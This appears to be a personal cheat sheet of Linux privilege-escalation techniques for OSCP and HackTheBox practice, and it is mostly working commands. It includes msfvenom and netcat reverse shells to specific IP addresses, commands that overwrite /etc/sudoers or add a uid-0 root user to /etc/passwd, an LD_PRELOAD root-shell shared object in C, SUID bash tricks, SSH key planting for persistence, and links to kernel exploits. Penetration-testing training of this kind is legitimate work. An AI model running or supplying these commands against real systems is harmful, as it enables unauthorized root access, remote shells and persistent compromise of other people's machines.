# Linux PrivEsc

{% embed url="https://github.com/RajChowdhury240/OSCP-CheatSheet/blob/main/Linux%20-%20Privilege%20Escalation.md" %}

{% embed url="https://ibb.co/7bwxyYh" %}

### Web Reverse Shell&#x20;

* App config file
* Server access (.htaccess, 000-default.conf)
* Git server
* Scripts that can run as elevated user - cronjob, path injection
* Docker container

Expose creds for valid user in system or privesc and generate SSH keys

#### Does your reverse shell always hang instantly?

* Use another payload duh \[perl slaps for arch/more tricky situations]
* Encode command and execute
* The `nohup` command in Linux ensures that a process continues running even after the terminal is closed or the user logs out.

{% embed url="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" %}

```bash
bash -c '[revshell payload]' #The single quotes make a big difference
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.218 LPORT=2222 -f raw > shell.sh
```

`rlwrap` helps in better usability but DOES NOT provide a full TTY it's still a PTY

{% code title="Upgrade Reverse Shell" %}
```bash
TTY Shells
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
Ctrl-Z

TTY Stabilization
# In Kali
echo $TERM 
stty -a

stty raw -echo; fg

# In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color [matching same TERM as that of our kali shell]
stty rows <num> columns <cols> [get values from stty -a]

SOCAT
sudo apt install rlwrap
rlwrap nc -lvnp <port>
```
{% endcode %}

<div align="left"><figure><img src="../.gitbook/assets/image (50).png" alt="" width="419"><figcaption><p>good times:)</p></figcaption></figure></div>

## Checklist

* Kernel and distribution release details
* Can you:
  * Run linPEAS for every user (New files accessible)
  * pspy64
  * Read ENV variables `/proc/self/environ & /proc/self/cmdline`
  * Add to sudoers
  * Copy file, change ownership, symlink
  * Revshell
  * User history such as .`zsh_history` or .`bash_history`
* User Information:
  * Attempt to read restricted files i.e. /etc/shadow
* Privileged access:
  * Which users have recently used sudo
  * Determine if /etc/sudoers is accessible
  * Is root's home directory accessible
  * List permissions for /home/
* Environmental:
  * Display current $PATH
  * Displays env information
* Version Information (of the following):
  * Sudo
  * MYSQL
  * Postgres
  * Apache
    * Checks user config
    * Shows enabled modules
    * Checks for htpasswd files
    * View www directories
* Searches:
  * Locate all SUID/GUID files
  * Locate all world-writable SUID/GUID files
  * Locate all SUID/GUID files owned by root
  * Locate 'interesting' SUID/GUID files (i.e. nmap, vim etc)
  * Locate files with POSIX capabilities
  * List all world-writable files
  * Show NFS server details
  * Locate \*.conf and \*.log files containing keyword supplied at script runtime
  * List all \*.conf files located in /etc
  * Locate mail

### Sudo and SUID

#### SUDO

Run a file as another user entirely

#### Add User to sudoers

```
echo “[user] ALL=(ALL) NOPASSWD: ALL” > /etc/sudoers
echo "alice ALL=(root) NOPASSWD: ALL" > /etc/sudoers
```

#### Add root user

```
pw=$(openssl passwd Password123); echo "r00t:${pw}:0:0:root:/root:/bin/bash" >> /etc/passwd
```

If `LD_PRELOAD` is explicitly defined in the sudoers file

```
Defaults        env_keep += LD_PRELOAD
```

Compile the following shared object using the C code below with \
`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

Execute any binary with the LD\_PRELOAD to spawn a shell : \
`sudo LD_PRELOAD=<full_path_to_so_file> <program>`\
e.g: `sudo LD_PRELOAD=/tmp/shell.so find`

#### SUID

#### Add SUID bit to Bash

```bash
chmod +s /bin/bash
#Run bash using -p flag to avoid dropping privs
/bin/bash -p
```

Run a file with the file permissions of the owner itself

```bash
find / -perm -g=s -type f 2>/dev/null    # SGID
find / -perm -u=s -type f 2>/dev/null    # SUID
```

#### Find SUID files <a href="#find-suid-root-files" id="find-suid-root-files"></a>

```bash
find / perm /u=s -user "[user]" 2>/dev/null 
find / -[group/user] [user] -ls 2>/dev/null
find / -user [user] -perm -4000 -print  2>/dev/null
find / -group [user] -perm -2000 -print 2>/dev/null
```

#### Find SUID and SGID files owned by anyone: <a href="#find-suid-and-sgid-files-owned-by-anyone" id="find-suid-and-sgid-files-owned-by-anyone"></a>

```bash
find / -perm -4000 -o -perm -2000 -print  2>/dev/null
```

#### Execute SUID via Python

```python
import os
os.setuid(0)
os.system("/bin/bash -p")

__import__('os').system('bash')
```

### Capabilities

More complex privilege control, run only specified actions with elevated privilege

```bash
/usr/bin/getcap -r / 2>/dev/null        # list all 
/usr/bin/setcap -r /bin/ping            # remove
/usr/bin/setcap cap_net_raw+p /bin/ping # add
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Binary Tracing <a href="#kernel" id="kernel"></a>

{% hint style="info" %}
Magic \[HTB Linux]
{% endhint %}

```bash
strings [bin]
strings -e l [bin]
strace -f [bin] [follows forks too, see the exec calls]
ltrace [bin] also works lowk
```

### PATH <a href="#kernel" id="kernel"></a>

When the exact path of a binary is not called, prepend our malicious one and it gets called first

```bash
echo $PATH
export PATH=<PATH/TO/FOLDER>:$PATH
#Binary to be called is placed and this path will be looked first
```

### Internal Services

To check internal services running that may not be accessible externally:

```
netstat -tulpn
ss -antp
```

### Symlink

Any operations involving backup/zip/file handling as sudo -> you know the play

```bash
ln -s [target_file] [source_file]
#ln -s [/root/.ssh/authorized_keys] [random_file] -> this file points towards SSH key
```

### Crontab <a href="#kernel" id="kernel"></a>

Jobs running at particular intervals

```bash
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root

crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
```

### Kernel <a href="#kernel" id="kernel"></a>

{% embed url="https://github.com/X0RW3LL/XenSpawn" %}

{% embed url="https://github.com/SecWiki/linux-kernel-exploits" %}

{% embed url="https://github.com/mzet-/linux-exploit-suggester" %}

{% embed url="https://github.com/jondonas/linux-exploit-suggester-2" %}

```bash
cat /proc/version
uname -a
uname -ar
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
```

{% embed url="https://github.com/CptGibbon/CVE-2021-3156" %}

{% embed url="https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit" %}
Just chmod and run binary
{% endembed %}

DirtyCow also go hard XenSpawn has the link for dirtycow i believe

### Wildcard

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks?source=post_page-----16397895490f--------------------------------" %}
READ from HTB Usage
{% endembed %}

### Languages

#### Python

```
import os
os.system("busybox nc 192.168.45.154 3306 -e bash")
```

## SSH

User password may be same as key passphrase

Check `/etc/ssh/sshd_config` if there are any problems

`sudo systemctl start ssh` to transfer between your Windows and kali VM

### SSH Keys

Every revshell as an actual user -> this is the play

{% embed url="https://mqt.gitbook.io/oscp-notes/ssh-keys" %}

```
KALI
ssh-keygen -t rsa
chmod 700 ~/.ssh; chmod 600 ~/.ssh/id_rsa [kali]

REMOTE
/home/user/.ssh$ echo "[id_rsa.pub value]" > authorized_keys
chmod 700 .ssh; chmod 600 .ssh/authorized_keys
```
